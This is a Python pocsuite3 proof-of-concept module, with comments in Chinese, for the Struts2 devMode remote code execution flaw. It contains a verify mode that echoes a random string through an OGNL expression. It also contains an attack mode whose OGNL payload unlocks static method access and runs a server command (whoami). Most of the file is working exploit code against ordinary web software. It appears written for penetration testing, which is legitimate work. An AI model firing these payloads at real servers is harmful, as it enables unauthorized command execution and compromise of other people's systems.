from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import VUL_TYPE, random_str
from pocsuite3.api import OptString


class STDEVMODE(POCBase):
    vulID = ''
    version = '1'
    author = 'minruizhang'
    vulDate = '2019-08-15'
    createDate = '2021-03-20'
    updateDate = '2021-03-20'
    references = ['https://www.freebuf.com/news/108924.html']
    name = 'Struts2 devMode导致远程代码执行漏洞'
    appPowerLink = 'https://struts.apache.org/'
    appName = 'Structs'
    appVersion = '2.1.0--2.5.1'
    vulType = VUL_TYPE.COMMAND_EXECUTION
    desc = '''
        当Struts2开启devMode模式时，将导致严重远程代码执行漏洞。
        如果WebService 启动权限为最高权限时，可远程执行任意命令，包括关机、建立新用户、以及删除服务器上所有文件等等
    '''
    samples = []
    install_requires = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP
    pocDesc = '''验证模式验证服务端回显'''

    def _options(self):
        o = OrderedDict()
        o["path"] = OptString('', description='执行的路径',
                              require=True)
        o["pocCookie"] = OptString('', description='可选cookie',
                                require=False)
        o["cmd"] = OptString('', description='attack模式下命令执行的内容',
                             require=False)
        return o

    def _verify(self):
        result = {}
        vul_path = self.get_option("path")
        if self.url.endswith("/"):
            url = self.url[:-1]
        else:
            url = self.url
        vul_url = url + vul_path
        check_data = random_str()
        verify_poc = "?debug=command" \
                     "&expression=(%23wr%3D%23context%5B%23parameters.obj%5B0%5D%5D.getWriter())!%3D(%23wr.println(%23parameters.content%5B0%5D))!%3D(%23wr.flush())!%3D(%23wr.close())" \
                     "&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse" \
                     "&content=" + check_data
        if self.get_option("pocCookie"):
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                       'Cookie': self.get_option("pocCookie")}
        else:
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"}
        vul_url_path = vul_url + verify_poc
        try:
            res = requests.post(url=vul_url_path,
                                headers=headers,
                                verify=False)
            if res and res.status_code == 200 and check_data in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['RESPONSE'] = res.text
        except Exception as e:
            pass
        return self.parse_output(result)

    def _attack(self):
        result = {}
        vul_path = self.get_option("path")
        if self.url.endswith("/"):
            url = self.url[:-1]
        else:
            url = self.url
        vul_url = url + vul_path
        attack_poc = "?debug=command" \
                     "&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29)"
        if self.get_option("pocCookie"):
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
                       'Cookie': self.get_option("pocCookie")}
        else:
            headers = {'User-Agent': "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"}
        vul_url_path = vul_url + attack_poc
        try:
            res = requests.post(url=vul_url_path,
                                headers=headers,
                                verify=False)
            if res and res.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['RESPONSE'] = res.text
        except Exception as e:
            pass
        return self.parse_output(result)


    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(STDEVMODE)
